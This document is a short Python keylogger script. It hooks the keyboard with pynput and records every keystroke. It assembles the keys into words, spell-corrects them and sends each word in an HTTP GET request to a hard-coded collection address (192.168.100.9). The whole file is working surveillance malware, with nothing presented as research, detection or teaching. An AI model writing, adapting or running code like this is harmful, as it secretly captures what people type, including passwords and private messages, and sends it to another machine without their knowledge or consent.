from pynput.keyboard import Listener
import re
from textblob import TextBlob
import requests

from spellchecker import SpellChecker
spell = SpellChecker()
word = ""

def reduce_lengthening(text):
    pattern = re.compile(r"(.)\1{2,}")
    return pattern.sub(r"\1\1", text)

def log_keystroke(key):
        global word

        key = str(key).replace("'", "")

        if key == 'Key.space':
                key = '&'
        if key == 'Key.shift_r':
                key = ''
        if key == 'Key.shift_l':
                key = ''
        if key == "Key.enter":
                key = '\n'
        if key == "Key.backspace":
                key = ''

        if (key == '&'):
                if (len(word) != 0):
                        try:
                                correct_word = spell.correction(word)
                                print(correct_word)
                                correct_word = "http://192.168.100.9/?&" + correct_word + "@"
                                #print(correct_word)
                                call = requests.get(correct_word)
                                call.close()

                                word = ""
                        except:
                                word = ""
        elif (key == '@'):
                pass
        else:
                word+=key

with Listener(on_press=log_keystroke) as l:
        l.join()

